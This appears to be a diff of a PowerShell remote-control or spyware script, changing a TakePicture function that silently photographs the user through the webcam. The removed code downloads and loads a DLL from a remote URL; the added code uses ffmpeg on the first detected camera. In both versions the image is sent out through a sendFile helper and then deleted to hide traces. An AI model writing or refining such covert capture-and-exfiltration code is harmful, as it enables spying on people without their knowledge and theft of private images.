@@ -870,23 +870,13 @@ Function SpeechToText {
 }
 
 Function TakePicture {
-    $dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
-    if (-not (Test-Path $dllPath)) {
-        $url = "https://github.com/beigeworm/assets/raw/main/webcam.dll"
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($url, $dllPath)
-    }
-    Add-Type -Path $dllPath
-    [Webcam.webcam]::init()
-    [Webcam.webcam]::select(1)
-    $imageBytes = [Webcam.webcam]::GetImage()
-    $tempDir = [System.IO.Path]::GetTempPath()
+    $tempDir = "$env:temp"
     $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
-    [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
+    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
+    .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
     sleep 1
     sendFile -sendfilePath $imagePath | Out-Null
     sleep 3
-    Remove-Item -Path "$env:TEMP\webcam.dll"
     Remove-Item -Path $imagePath -Force
 }
 
